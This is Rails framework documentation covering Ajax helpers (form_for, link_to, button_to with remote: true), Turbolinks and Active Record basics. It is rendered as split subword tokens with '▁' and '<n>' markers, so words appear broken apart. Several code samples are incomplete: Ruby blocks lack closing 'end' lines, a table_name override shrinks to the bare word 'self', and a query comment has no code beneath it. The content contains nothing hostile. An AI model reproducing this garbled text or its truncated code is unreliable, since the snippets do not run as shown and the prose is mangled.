▁We ▁can ▁serve ▁our ▁entire ▁JavaScript ▁bundle ▁on ▁every ▁page , ▁which < n > me an s ▁that ▁it ' ll ▁get ▁ download ed ▁on ▁the ▁first ▁page ▁load ▁and ▁the n ▁be ▁cached ▁on < n > ever y ▁page ▁after ▁that .
▁L o t s ▁of ▁little ▁benefit s ▁really ▁add ▁up .
▁The ▁Rails ▁team ▁ strong ly ▁encourag es ▁you ▁to ▁write ▁your ▁CoffeeScript ▁( and < n > JavaScript ) ▁in ▁this ▁style , ▁and ▁you ▁can ▁expect ▁that ▁many ▁libraries ▁will ▁also < n > follow ▁this ▁pattern .
▁B u il t - in ▁ Helpers
▁Rails ▁provides ▁a ▁b un ch ▁of ▁view ▁helper ▁methods ▁written ▁in ▁Ruby ▁to ▁assist ▁you < n > in ▁ generating ▁HTML .
▁Sometimes , ▁you ▁want ▁to ▁add ▁a ▁little ▁Ajax ▁to ▁those ▁elements ,< n > and ▁Rails ▁has ▁go t ▁your ▁back ▁in ▁those ▁cases .
▁Because ▁of ▁U nobtrusive ▁JavaScript , ▁the ▁Rails ▁" A j a x ▁helpers " ▁are ▁actually ▁in ▁two < n > part s : ▁the ▁JavaScript ▁half ▁and ▁the ▁Ruby ▁half .
▁[ rails . js ]( https :// github . com / rails / jquery - u js / blo b / master / s r c / rails . js )< n > provide s ▁the ▁JavaScript ▁half , ▁and ▁the ▁regular ▁Ruby ▁view ▁helpers ▁add ▁appropriate < n > tag s ▁to ▁your ▁DOM .
▁The ▁CoffeeScript ▁in ▁rails . js ▁the n ▁list en s ▁for ▁these < n > attributes , ▁and ▁attach es ▁appropriate ▁handle r s .
▁### ▁form _ for
▁[ ` form _ for ` ]( http :// api . rubyonrails . org / classes / ActionView / Helpers / For m Helper . html # method - i - form _ for )< n > is ▁a ▁helper ▁that ▁assist s ▁with ▁writing ▁forms .
▁` form _ for ` ▁take s ▁a ▁`: remote `< n > option .
▁`` ` erb
▁<%= ▁form _ for (@ article , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁...
▁<% ▁end ▁%>
▁This ▁will ▁generate ▁the ▁following ▁HTML :
▁< form ▁accept - cha r set =" UT F -8 " ▁action =" / articles " ▁class =" new _ article " ▁data - remote =" true " ▁id =" new _ article " ▁method =" post ">
▁</ form >
▁Note ▁the ▁` data - remote =" true " `.
▁Now , ▁the ▁form ▁will ▁be ▁submitted ▁by ▁Ajax ▁rather < n > th an ▁by ▁the ▁browser ' s ▁normal ▁submit ▁ mechanism .
▁You ▁ probably ▁don ' t ▁want ▁to ▁just ▁ s it ▁there ▁with ▁a ▁ filled ▁out ▁` < form >` , ▁though . < n >
▁You ▁ probably ▁want ▁to ▁do ▁something ▁upon ▁a ▁successful ▁submission .
▁To ▁do ▁that ,< n > bin d ▁to ▁the ▁` ajax : success ` ▁even t .
▁On ▁failure , ▁use ▁` ajax : error `.
▁Check ▁it ▁out :
▁ $ ( document ). read y ▁->
▁ $ (" # new _ article ") . on (" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁ $ (" # new _ article ") . app end ▁ xhr . response T ext
▁ ). on ▁" ajax : error ", ▁( e , ▁ xhr , ▁status , ▁error ) ▁->
▁ $ (" # new _ article ") . app end ▁" < p > ER R O R </ p > "
▁O b v ious ly , ▁you ' ll ▁want ▁to ▁be ▁a ▁bit ▁more ▁sophisticat ed ▁than ▁that , ▁but ▁it ' s ▁a < n > start .
▁You ▁can ▁see ▁more ▁about ▁the ▁even t s ▁[ in ▁the ▁ jquery - u js ▁ wiki ]( https :// github . com / rails / jquery - u js / wiki / ajax ).
▁### ▁form _ tag
▁[ ` form _ tag ` ]( http :// api . rubyonrails . org / classes / ActionView / Helpers / For m T a g Helper . html # method - i - form _ tag )< n > is ▁very ▁similar ▁to ▁` form _ for `.
▁It ▁has ▁a ▁`: remote ` ▁option ▁that ▁you ▁can ▁use ▁like < n > this :
▁<%= ▁form _ tag (' / articles ' , ▁remote : ▁true ) ▁do ▁%>
▁< form ▁accept - cha r set =" UT F -8 " ▁action =" / articles " ▁data - remote =" true " ▁method =" post ">
▁E verything ▁else ▁is ▁the ▁same ▁as ▁` form _ for `.
▁See ▁its ▁documentation ▁for ▁full < n > de t a il s .
▁### ▁link _ to
▁[ ` link _ to ` ]( http :// api . rubyonrails . org / classes / ActionView / Helpers / U r l Helper . html # method - i - link _ to )< n > is ▁a ▁helper ▁that ▁assist s ▁with ▁ generating ▁links .
▁It ▁has ▁a ▁`: remote ` ▁option ▁you < n > can ▁use ▁like ▁this :
▁<%= ▁link _ to ▁" an ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁which ▁generates
▁< a ▁ href =" / articles /1 " ▁data - remote =" true "> an ▁article </ a >
▁You ▁can ▁bin d ▁to ▁the ▁same ▁Ajax ▁even t s ▁as ▁` form _ for `.
▁Let ' s < n > as sum e ▁that ▁we ▁have ▁a ▁list ▁of ▁articles ▁that ▁can ▁be ▁deleted ▁with ▁just ▁one < n > click .
▁We ▁would ▁generate ▁some ▁HTML ▁like ▁this :
▁<%= ▁link _ to ▁" D e let e ▁article ", ▁@ article , ▁remote : ▁true , ▁method : ▁: delete ▁%>
▁and ▁write ▁some ▁CoffeeScript ▁like ▁this :
▁ $ (" a [ data - remote ] ") . on ▁" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁ alert ▁" The ▁article ▁was ▁deleted . "
▁### ▁button _ to
▁[ ` button _ to ` ]( http :// api . rubyonrails . org / classes / ActionView / Helpers / U r l Helper . html # method - i - button _ to ) ▁is ▁a ▁helper ▁that ▁help s ▁you ▁create ▁button s .
▁It ▁has ▁a ▁`: remote ` ▁option ▁that ▁you ▁can ▁call ▁like ▁this :
▁<%= ▁button _ to ▁" A n ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁this ▁generates
▁< form ▁action =" / articles /1 " ▁class =" button _ to " ▁data - remote =" true " ▁method =" post ">
▁< div >< input ▁type =" submit " ▁value =" A n ▁article " ></ div >
▁S ince ▁it ' s ▁just ▁a ▁` < form >` , ▁all ▁of ▁the ▁information ▁on ▁` form _ for ` ▁also ▁applies .
▁ Server - S id e ▁ Concern s
▁Ajax ▁is n ' t ▁just ▁client - side , ▁you ▁also ▁need ▁to ▁do ▁some ▁work ▁on ▁the ▁server < n > side ▁to ▁support ▁it .
▁Of t en , ▁people ▁like ▁their ▁Ajax ▁requests ▁to ▁return ▁JSON < n > rather ▁than ▁HTML .
▁Let ' s ▁discuss ▁what ▁it ▁take s ▁to ▁make ▁that ▁happen .
▁### ▁A ▁S i mp le ▁Example
▁Imag ine ▁you ▁have ▁a ▁series ▁of ▁users ▁that ▁you ▁would ▁like ▁to ▁display ▁and ▁provide ▁a < n > form ▁on ▁that ▁same ▁page ▁to ▁create ▁a ▁new ▁user .
▁The ▁index ▁action ▁of ▁your < n > controller ▁look s ▁like ▁this :
▁class ▁ UsersController ▁< ▁Application Controller
▁def ▁index
▁@ users ▁= ▁User . all
▁@ user ▁= ▁User . new
▁The ▁index ▁view ▁( ` app / views / users / index . html . erb `) ▁contains :
▁< b > Users </ b >
▁< ul ▁id =" users ">
▁<%= ▁render ▁@ users ▁%>
▁</ ul >
▁<%= ▁form _ for (@ user , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: name ▁%>< br >
▁<%= ▁f . text _ field ▁: name ▁%>
▁<%= ▁f . submit ▁%>
▁The ▁` app / views / users / _ user . html . erb ` ▁partial ▁contains ▁the ▁following :
▁< li > <%= ▁user . name ▁%></ li >
▁The ▁to p ▁ port ion ▁of ▁the ▁index ▁page ▁display s ▁the ▁users .
▁The ▁bottom ▁ port ion < n > provide s ▁a ▁form ▁to ▁create ▁a ▁new ▁user .
▁The ▁bottom ▁form ▁will ▁call ▁the ▁` create ` ▁action ▁on ▁the ▁` UsersController `.
▁Because < n > the ▁form ' s ▁remote ▁option ▁is ▁set ▁to ▁true , ▁the ▁request ▁will ▁be ▁post ed ▁to ▁the < n >` UsersController ` ▁as ▁an ▁Ajax ▁request , ▁look ing ▁for ▁JavaScript .
▁this :
▁# ▁app / controllers / users _ controller . rb
▁# ▁... . . .
▁def ▁create
▁@ user ▁= ▁User . new ( params [: user ])
▁respond _ to ▁do ▁| format |
▁if ▁@ user . save
▁format . html ▁ { ▁redirect _ to ▁@ user , ▁notice : ▁' User ▁was ▁successfully ▁created . '
▁format . js ▁ { }
▁format . json ▁ { ▁render ▁ json : ▁@ user , ▁status : ▁: created , ▁location : ▁@ user ▁ }
▁else
▁format . html ▁ { ▁render ▁action : ▁" new " ▁ }
▁format . json ▁ { ▁render ▁ json : ▁@ user . errors , ▁status : ▁: un process able _ ent ity ▁ }
▁end
▁Noti ce ▁the ▁format . js ▁in ▁the ▁` respond _ to ` ▁block ; ▁that ▁allows ▁the ▁controller ▁to < n > respond ▁to ▁your ▁Ajax ▁request .
▁You ▁the n ▁have ▁a ▁corresponding < n >` app / views / users / create . js . erb ` ▁view ▁file ▁that ▁generates ▁the ▁actual ▁JavaScript < n > code ▁that ▁will ▁be ▁sent ▁and ▁executed ▁on ▁the ▁client ▁side .
▁ $ (" <%= ▁escape _ javascript ( render ▁@ user ) ▁%> ") . app end To (" # users ") ;
▁ Turbolinks
▁Rails ▁4 ▁ s h ips ▁with ▁the ▁[ Turbolinks ▁gem ]( https :// github . com / rails / turbolinks ). < n >
▁This ▁gem ▁uses ▁Ajax ▁to ▁speed ▁up ▁page ▁rendering ▁in ▁most ▁applications .
▁### ▁How ▁ Turbolinks ▁Work s
▁ Turbolinks ▁attach es ▁a ▁click ▁handle r ▁to ▁all ▁` < a >` ▁on ▁the ▁page .
▁It < n > will ▁the n ▁use ▁P us h State ▁to ▁change ▁the ▁URL ▁to ▁the ▁correct ▁one , ▁pre s er v ing < n > ref re s h ▁ s em ant ic s ▁and ▁giv ing ▁you ▁ pretty ▁URLs .
▁The ▁only ▁thing ▁you ▁have ▁to ▁do ▁to ▁enable ▁ Turbolinks ▁is ▁have ▁it ▁in ▁your ▁Gemfile ,< n > and ▁put ▁` //= ▁require ▁ turbolinks ` ▁in ▁your ▁CoffeeScript ▁manifest , ▁which ▁is ▁usually < n >` app / assets / javascripts / application . js `.
▁If ▁you ▁want ▁to ▁disable ▁ Turbolinks ▁for ▁certain ▁links , ▁add ▁a ▁` data - no - t u rb o link `< n > attribute ▁to ▁the ▁tag :
▁< a ▁ href =" ..." ▁data - no - t u rb o link > N o ▁ turbolinks ▁here </ a > .
▁### ▁P age ▁Change ▁Even t s
▁When ▁writing ▁CoffeeScript , ▁you ' ll ▁often ▁want ▁to ▁do ▁some ▁sort ▁of ▁process ing ▁upon < n > page ▁load .
▁With ▁jQuery , ▁you ' d ▁write ▁something ▁like ▁this :
▁ alert ▁" page ▁has ▁loaded !"
▁However , ▁because ▁ Turbolinks ▁override s ▁the ▁normal ▁page ▁load ing ▁process , ▁the < n > even t ▁that ▁this ▁relie s ▁on ▁will ▁not ▁be ▁fire d .
▁If ▁you ▁have ▁code ▁that ▁look s ▁like < n > this , ▁you ▁must ▁change ▁your ▁code ▁to ▁do ▁this ▁instead :
▁ $ ( document ). on ▁" page : change ", ▁->
▁For ▁more ▁details , ▁including ▁other ▁even t s ▁you ▁can ▁bin d ▁to , ▁check ▁out ▁[ the < n > Turbolinks < n > README ]( https :// github . com / rails / turbolinks / blo b / master / README . m d ).
▁Other ▁Resource s
▁Here ▁are ▁some ▁helpful ▁links ▁to ▁help ▁you ▁learn ▁even ▁more :
▁* ▁[ jquery - u js ▁ wiki ]( https :// github . com / rails / jquery - u js / wiki )
▁* ▁[ jquery - u js ▁list ▁of ▁external ▁articles ]( https :// github . com / rails / jquery - u js / wiki / Ex ter n al - articles )
▁* ▁[ Rails ▁3 ▁Re m o t e ▁Link s ▁and ▁For m s : ▁A ▁Defin i tive ▁G u id e ]( http :// www . al fa j an go . com / blog / rails - 3- remote - links - and - form s / )
▁* ▁[ R ailscasts : ▁U nobtrusive ▁JavaScript ]( http :// r ailscasts . com / episodes / 20 5 - u nobtrusive - javascript )
▁* ▁[ R ailscasts : ▁ Turbolinks ]( http :// r ailscasts . com / episodes / 39 0 - turbolinks )
▁Active ▁Record ▁B as ic s
▁ ========== ==========
▁This ▁guide ▁is ▁an ▁introduction ▁to ▁Active ▁Record .
▁* ▁What ▁Object ▁ Relation al ▁M app ing ▁and ▁Active ▁Record ▁are ▁and ▁how ▁they ▁are ▁used ▁in < n > ▁Rails .
▁* ▁How ▁Active ▁Record ▁fit s ▁into ▁the ▁Model - View - Controller ▁p ar ad ig m .
▁* ▁How ▁to ▁use ▁Active ▁Record ▁models ▁to ▁manipulate ▁data ▁store d ▁in ▁a ▁relation al < n > ▁database .
▁* ▁Active ▁Record ▁ schema ▁naming ▁convention s .
▁* ▁The ▁ concept s ▁of ▁database ▁migrations , ▁validations ▁and ▁callbacks .
▁What ▁is ▁Active ▁Record ?
▁Active ▁Record ▁is ▁the ▁M ▁in ▁[ MVC ]( getting _ started . html # the - mvc - ar ch ite c t ure ) ▁- ▁the < n > model ▁- ▁which ▁is ▁the ▁layer ▁of ▁the ▁system ▁responsib le ▁for ▁represent ing ▁ business < n > data ▁and ▁logic .
▁Active ▁Record ▁facilit ate s ▁the ▁creation ▁and ▁use ▁of ▁ business < n > objects ▁who se ▁data ▁requires ▁ persistent ▁storage ▁to ▁a ▁database .
▁It ▁is ▁an < n > implementation ▁of ▁the ▁Active ▁Record ▁pattern ▁which ▁itself ▁is ▁a ▁description ▁of ▁an < n > Object ▁ Relation al ▁M app ing ▁system .
▁### ▁The ▁Active ▁Record ▁ Pattern
▁[ Active ▁Record ▁was ▁describe d ▁by ▁M ar t in ▁F o w ler ]( http :// www . m ar t info w ler . com / e a a C at a log / active Record . html )< n > in ▁his ▁book ▁ _ Pattern s ▁of ▁E nterprise ▁Application ▁A r ch ite c t ure _ .
▁In < n > Active ▁Record , ▁objects ▁c ar ry ▁both ▁ persistent ▁data ▁and ▁behavior ▁which < n > o p er ate s ▁on ▁that ▁data .
▁### ▁Object ▁ Relation al ▁M app ing
▁Object - Relation al ▁M app ing , ▁commonly ▁ referred ▁to ▁as ▁its ▁a b br evi ation ▁OR M , ▁is < n > a ▁technique ▁that ▁connect s ▁the ▁rich ▁objects ▁of ▁an ▁application ▁to ▁table s ▁in < n > a ▁relation al ▁database ▁manage ment ▁system .
▁Using ▁OR M , ▁the ▁ properties ▁and < n > relationships ▁of ▁the ▁objects ▁in ▁an ▁application ▁can ▁be ▁easily ▁store d ▁and < n > r etriev ed ▁from ▁a ▁database ▁without ▁writing ▁SQL ▁statement s ▁directly ▁and ▁with ▁less < n > over all ▁database ▁access ▁code .
▁### ▁Active ▁Record ▁as ▁an ▁OR M ▁ Frame work
▁Active ▁Record ▁gives ▁us ▁sever al ▁ mechanism s , ▁the ▁most ▁important ▁being ▁the ▁ability < n > to :
▁* ▁Re present ▁models ▁and ▁their ▁data .
▁* ▁Re present ▁associations ▁between ▁these ▁models .
▁* ▁Re present ▁inheritance ▁ hierarchies ▁through ▁related ▁models .
▁* ▁Validat e ▁models ▁before ▁they ▁get ▁persist ed ▁to ▁the ▁database .
▁* ▁P er form ▁database ▁operations ▁in ▁an ▁object - or i ent ed ▁f as h ion .
▁Co n v ent ion ▁over ▁Configuration ▁in ▁Active ▁Record
▁When ▁writing ▁applications ▁using ▁other ▁programming ▁languages ▁or ▁frameworks , ▁it < n > ma y ▁be ▁necessary ▁to ▁write ▁a ▁lot ▁of ▁configuration ▁code .
▁This ▁is ▁particular ly ▁true < n > for ▁OR M ▁frameworks ▁in ▁general .
▁However , ▁if ▁you ▁follow ▁the ▁convention s ▁a do p t ed ▁by < n > Rails , ▁you ' ll ▁need ▁to ▁write ▁very ▁little ▁configuration ▁( in ▁some ▁case ▁no < n > configuration ▁at ▁all ) ▁when ▁creating ▁Active ▁Record ▁models .
▁The ▁idea ▁is ▁that ▁if < n > you ▁configure ▁your ▁applications ▁in ▁the ▁very ▁same ▁way ▁most ▁of ▁the ▁time ▁the n ▁this < n > s h o ul d ▁be ▁the ▁default ▁way .
▁Thus , ▁explicit ▁configuration ▁would ▁be ▁needed < n > only ▁in ▁those ▁cases ▁where ▁you ▁can ' t ▁follow ▁the ▁standard ▁convention .
▁### ▁N am ing ▁Co n v ent ion s
▁By ▁default , ▁Active ▁Record ▁uses ▁some ▁naming ▁convention s ▁to ▁find ▁out ▁how ▁the < n > m app ing ▁between ▁models ▁and ▁database ▁table s ▁should ▁be ▁created .
▁Rails ▁will < n > pluralize ▁your ▁class ▁names ▁to ▁find ▁the ▁respective ▁database ▁table .
▁So , ▁for < n > a ▁class ▁` Book `, ▁you ▁should ▁have ▁a ▁database ▁table ▁called ▁** books ** .
▁The ▁Rails < n > pluralization ▁ mechanism s ▁are ▁very ▁powerful , ▁being ▁capab le ▁to ▁ pluralize ▁( and < n > singularize ) ▁both ▁regular ▁and ▁ ir r egular ▁words .
▁When ▁using ▁class ▁names ▁composed < n > of ▁two ▁or ▁more ▁words , ▁the ▁model ▁class ▁name ▁should ▁follow ▁the ▁Ruby ▁convention s ,< n > using ▁the ▁ CamelCase ▁form , ▁while ▁the ▁table ▁name ▁must ▁contain ▁the ▁words ▁separate d < n > by ▁ underscore s .
▁Example s :
▁* ▁Database ▁Table ▁- ▁P l ur al ▁with ▁ underscore s ▁ se p ar at ing ▁words ▁( e . g . , ▁` book _ c l u b s ` ).
▁* ▁Model ▁ Class ▁- ▁S ing ul ar ▁with ▁the ▁first ▁letter ▁of ▁each ▁word ▁ capitalize d ▁( e . g . ,< n >` Book C l u b ` ).
▁| ▁Model ▁/ ▁ Class ▁| ▁Table ▁/ ▁S ch e ma ▁|
▁| ▁` L ine It em ` ▁| ▁` line _ item s ` ▁|
▁| ▁` D e er ` ▁| ▁` de ers ` ▁|
▁| ▁` M ous e ` ▁| ▁` m ic e ` ▁|
▁| ▁` Person ` ▁| ▁` people ` ▁|
▁### ▁S ch e ma ▁Co n v ent ion s
▁Active ▁Record ▁uses ▁naming ▁convention s ▁for ▁the ▁columns ▁in ▁database ▁table s ,< n > de pending ▁on ▁the ▁purpose ▁of ▁these ▁columns .
▁* ▁** For e ig n ▁keys ** ▁- ▁These ▁fields ▁should ▁be ▁named ▁following ▁the ▁pattern < n > ▁` singularize d _ table _ name _ id ` ▁( e . g . , ▁` item _ id `, ▁` order _ id ` ).
▁These ▁are ▁the < n > ▁fields ▁that ▁Active ▁Record ▁will ▁look ▁for ▁when ▁you ▁create ▁associations ▁between < n > ▁your ▁models .
▁* ▁** P r i m ary ▁keys ** ▁- ▁By ▁default , ▁Active ▁Record ▁will ▁use ▁an ▁integer ▁column ▁named < n > ▁` id ` ▁as ▁the ▁table ' s ▁primary ▁key .
▁When ▁using ▁[ Active ▁Record < n > ▁Migrations ]( migrations . html ) ▁to ▁create ▁your ▁table s , ▁this ▁column ▁will ▁be < n > ▁automatically ▁created .
▁There ▁are ▁also ▁some ▁optional ▁column ▁names ▁that ▁will ▁add ▁ additional ▁features < n > to ▁Active ▁Record ▁instance s :
▁* ▁` created _ at ` ▁- ▁A utomatically ▁get s ▁set ▁to ▁the ▁current ▁date ▁and ▁time ▁when ▁the < n > ▁record ▁is ▁first ▁created .
▁* ▁` updated _ at ` ▁- ▁A utomatically ▁get s ▁set ▁to ▁the ▁current ▁date ▁and ▁time ▁when ever < n > ▁the ▁record ▁is ▁updated .
▁* ▁` lock _ version ` ▁- ▁Add s ▁[ o ptimistic < n > ▁ lock ing ]( http :// api . rubyonrails . org / classes / ActiveRecord / Lock ing . html ) ▁to < n > ▁a ▁model .
▁* ▁` ( association _ name ) _ type ` ▁- ▁ Store s ▁the ▁type ▁for < n > ▁[ polymorphic ▁associations ]( association _ basic s . html # polymorphic - associations ).
▁* ▁` ( table _ name ) _ count ` ▁- ▁Use d ▁to ▁cache ▁the ▁number ▁of ▁ belonging ▁objects ▁on < n > ▁associations .
▁NOTE : ▁Whi le ▁these ▁column ▁names ▁are ▁optional , ▁they ▁are ▁in ▁fact ▁reserved ▁by ▁Active ▁Record .
▁S t e er ▁clear ▁of ▁reserved ▁keyword s ▁unless ▁you ▁want ▁the ▁extra ▁functionality .
▁For ▁example , ▁` type ` ▁is ▁a ▁reserved ▁keyword ▁used ▁to ▁design ate ▁a ▁table ▁using ▁S ing le ▁Table ▁In h er it ance ▁( ST I ).
▁If ▁you ▁are ▁not ▁using ▁ ST I , ▁try ▁an ▁analogous ▁keyword ▁like ▁" co n text ", ▁that ▁may ▁ still ▁a cc ur ate ly ▁describe ▁the ▁data ▁you ▁are ▁model ing .
▁Creat ing ▁Active ▁Record ▁Model s
▁It ▁is ▁very ▁easy ▁to ▁create ▁Active ▁Record ▁models .
▁All ▁you ▁have ▁to ▁do ▁is ▁to < n > sub class ▁the ▁` ActiveRecord :: Base ` ▁class ▁and ▁you ' re ▁good ▁to ▁go :
▁class ▁ Product ▁< ▁ActiveRecord :: Base
▁This ▁will ▁create ▁a ▁` Product ` ▁model , ▁map ped ▁to ▁a ▁` products ` ▁table ▁at ▁the < n > database .
▁By ▁doing ▁this ▁you ' ll ▁also ▁have ▁the ▁ability ▁to ▁map ▁the ▁columns ▁of ▁each < n > row ▁in ▁that ▁table ▁with ▁the ▁attributes ▁of ▁the ▁instance s ▁of ▁your ▁model .
▁Suppose < n > that ▁the ▁` products ` ▁table ▁was ▁created ▁using ▁an ▁SQL ▁ sentence ▁like :
▁C RE A T E ▁T A B LE ▁ products ▁(
▁id ▁in t ( 11 ) ▁ NOT ▁NULL ▁ auto _ increment ,
▁name ▁var cha r ( 2 5 5 ),
▁P R I M A R Y ▁ K E Y ▁( id )
▁Follow ing ▁the ▁table ▁ schema ▁above , ▁you ▁would ▁be ▁able ▁to ▁write ▁code ▁like ▁the < n > following :
▁p ▁= ▁ Product . new
▁p . name ▁= ▁" S o me ▁ Book "
▁put s ▁p . name ▁# ▁" S o me ▁ Book "
▁ Overriding ▁the ▁N am ing ▁Co n v ent ion s
▁What ▁if ▁you ▁need ▁to ▁follow ▁a ▁different ▁naming ▁convention ▁or ▁need ▁to ▁use ▁your < n > Rails ▁application ▁with ▁a ▁ le g ac y ▁database ?
▁No ▁problem , ▁you ▁can ▁easily ▁override < n > the ▁default ▁convention s .
▁You ▁can ▁use ▁the ▁` ActiveRecord :: Base . table _ name = ` ▁method ▁to ▁specify ▁the ▁table < n > name ▁that ▁should ▁be ▁used :
▁self
▁It ' s ▁also ▁possible ▁to ▁override ▁the ▁column ▁that ▁should ▁be ▁used ▁as ▁the ▁table ' s < n > primary ▁key ▁using ▁the ▁` ActiveRecord :: Base . primary _ key = ` ▁method :
▁self . primary _ key ▁= ▁" product _ id "
▁CRUD : ▁Read ing ▁and ▁Writ ing ▁ Data
▁-------------- ----------------
▁CRUD ▁is ▁an ▁ acronym ▁for ▁the ▁four ▁verb s ▁we ▁use ▁to ▁operat e ▁on ▁data : ▁** C ** re ate ,< n > ** R ** e ad , ▁** U ** p date ▁and ▁** D ** e let e .
▁Active ▁Record ▁automatically ▁creates ▁methods < n > to ▁allow ▁an ▁application ▁to ▁read ▁and ▁manipulate ▁data ▁store d ▁within ▁its ▁table s .
▁### ▁Create
▁Active ▁Record ▁objects ▁can ▁be ▁created ▁from ▁a ▁hash , ▁a ▁block ▁or ▁have ▁their < n > attributes ▁manually ▁set ▁after ▁creation .
▁The ▁` new ` ▁method ▁will ▁return ▁a ▁new < n > object ▁while ▁` create ` ▁will ▁return ▁the ▁object ▁and ▁save ▁it ▁to ▁the ▁database .
▁For ▁example , ▁given ▁a ▁model ▁` User ` ▁with ▁attributes ▁of ▁` name ` ▁and ▁` o cc up ation `, < n > the ▁` create ` ▁method ▁call ▁will ▁create ▁and ▁save ▁a ▁new ▁record ▁into ▁the ▁database :
▁user ▁= ▁User . create ( name : ▁" David ", ▁ o cc up ation : ▁" C ode ▁A r t ist ")
▁Using ▁the ▁` new ` ▁method , ▁an ▁object ▁can ▁be ▁ instantiated ▁without ▁being ▁saved :
▁user ▁= ▁User . new
▁user . name ▁= ▁" David "
▁user . o cc up ation ▁= ▁" C ode ▁A r t ist "
▁A ▁call ▁to ▁` user . save ` ▁will ▁commit ▁the ▁record ▁to ▁the ▁database .
▁F inally , ▁if ▁a ▁block ▁is ▁provided , ▁both ▁` create ` ▁and ▁` new ` ▁will ▁yield ▁the ▁new < n > object ▁to ▁that ▁block ▁for ▁initialization :
▁user ▁= ▁User . new ▁do ▁| u |
▁ u . name ▁= ▁" David "
▁ u . o cc up ation ▁= ▁" C ode ▁A r t ist "
▁### ▁Read
▁Active ▁Record ▁provides ▁a ▁rich ▁API ▁for ▁access ing ▁data ▁within ▁a ▁database .
▁Be low < n > a re ▁a ▁few ▁examples ▁of ▁different ▁data ▁access ▁methods ▁provided ▁by ▁Active ▁Record .
▁# ▁return ▁a ▁collection ▁with ▁all ▁users
▁users ▁= ▁User . all
▁# ▁return ▁the ▁first ▁user
▁user ▁= ▁User . first
▁# ▁return ▁the ▁first ▁user ▁named ▁ David
▁d a v id ▁= ▁User . find _ by ( name : ▁' David ')
▁# ▁find ▁all ▁users ▁named ▁ David ▁who ▁are ▁Code ▁A r t ist s ▁and ▁sort ▁by ▁created _ at ▁in ▁reverse ▁ ch r on o log ical ▁order
▁You ▁can ▁learn ▁more ▁about ▁query ing ▁an ▁Active ▁Record ▁model ▁in ▁the ▁[ Active ▁Record < n > Query ▁In ter fa ce ]( active _ record _ query ing . html ) ▁guide .
▁### ▁Update
▁On ce ▁an ▁Active ▁Record ▁object ▁has ▁been ▁retrieved , ▁its ▁attributes ▁can ▁be ▁modified < n > and ▁it ▁can ▁be ▁saved ▁to ▁the ▁database .
▁user ▁= ▁User . find _ by ( name : ▁' David ')
▁user . name ▁= ▁' D a ve '
▁user . save
▁A ▁shorthand ▁for ▁this ▁is ▁to ▁use ▁a ▁hash ▁mapping ▁attribute ▁names ▁to ▁the ▁desired < n > value , ▁like ▁so :
▁user . update ( name : ▁' D a ve ')
▁This ▁is ▁most ▁useful ▁when ▁updating ▁sever al ▁attributes ▁at ▁once .
▁If , ▁on ▁the ▁other < n > h and , ▁you ' d ▁like ▁to ▁update ▁sever al ▁records ▁in ▁b ul k , ▁you ▁may ▁find ▁the < n >` update _ all ` ▁class ▁method ▁useful :
▁User . update _ all ▁" ma x _ login _ attempt s ▁= ▁3 , ▁must _ change _ password ▁= ▁' true ' "
▁### ▁Delet e
▁Like wise , ▁once ▁retrieved ▁an ▁Active ▁Record ▁object ▁can ▁be ▁destroyed ▁which ▁remove s < n > it ▁from ▁the ▁database .
▁user . destroy
▁Validation s
▁-- ---------
▁Active ▁Record ▁allows ▁you ▁to ▁validate ▁the ▁state ▁of ▁a ▁model ▁before ▁it ▁get s ▁written < n > in to ▁the ▁database .
▁There ▁are ▁sever al ▁methods ▁that ▁you ▁can ▁use ▁to ▁check ▁your < n > models ▁and ▁validate ▁that ▁an ▁attribute ▁value ▁is ▁not ▁empty , ▁is ▁unique ▁and ▁not < n > already ▁in ▁the ▁database , ▁follows ▁a ▁specific ▁format ▁and ▁many ▁more .
▁A ▁quick ▁example ▁to ▁illustrate :
▁validates ▁: name , ▁presence : ▁true
▁# ▁=> ▁false
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁Name ▁can ' t ▁be ▁blank
▁You ▁can ▁learn ▁more ▁about ▁validations ▁in ▁the ▁[ Active ▁Record ▁Validation s < n > guid e ]( active _ record _ validations . html ).
▁Active ▁Record ▁callbacks ▁allow ▁you ▁to ▁attach ▁code ▁to ▁certain ▁even t s ▁in ▁the < n > life - c y c le ▁of ▁your ▁models .
▁This ▁enable s ▁you ▁to ▁add ▁behavior ▁to ▁your ▁models ▁by < n > tr an s parent ly ▁execut ing ▁code ▁when ▁those ▁even t s ▁occur , ▁like ▁when ▁you ▁create ▁a ▁new < n > record , ▁update ▁it , ▁destroy ▁it ▁and ▁so ▁on .
▁You ▁can ▁learn ▁more ▁about ▁callbacks ▁in < n > the ▁[ Active ▁Record ▁ Callbacks ▁guide ]( active _ record _ callback s . html ).
▁Migrations
▁Rails ▁provides ▁a ▁domain - specific ▁language ▁for ▁m an a g ing ▁a ▁database ▁ schema ▁called < n > migrations .
▁Migrations ▁are ▁store d ▁in ▁files ▁which ▁are ▁executed ▁again st ▁any < n > database ▁that ▁Active ▁Record ▁supports ▁using ▁` rake `.
▁Here ' s ▁a ▁migration ▁that < n > create s ▁a ▁table :
▁class ▁Create P u b li c ation s ▁< ▁ActiveRecord :: Migration
▁def ▁change
▁create _ table ▁: public ation s ▁do ▁| t |
▁t . string ▁: title
▁t . text ▁: description
▁t . reference s ▁: public ation _ type
▁t . integer ▁: p u b li s h er _ id
▁t . string ▁: p u b li s h er _ type
▁t . boolean ▁: s ing le _ issue
▁t . timestamp s
▁add _ index ▁: public ation s , ▁: public ation _ type _ id
▁Rails ▁keep s ▁track ▁of ▁which ▁files ▁have ▁been ▁commit t ed ▁to ▁the ▁database ▁and < n > provide s ▁ rollback ▁features .
▁To ▁actually ▁create ▁the ▁table , ▁you ' d ▁run ▁` rake ▁db : migrate `< n > and ▁to ▁roll ▁it ▁back , ▁` rake ▁db : rollback `.
▁Note ▁that ▁the ▁above ▁code ▁is ▁database - a g no s tic : ▁it ▁will ▁run ▁in ▁MySQL ,< n > Post g re SQL , ▁Or ac le ▁and ▁other s .
▁You ▁can ▁learn ▁more ▁about ▁migrations ▁in ▁the < n >[ Active ▁Record ▁Migrations ▁guide ]( migrations . html ).
▁Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In
▁= ================ ================
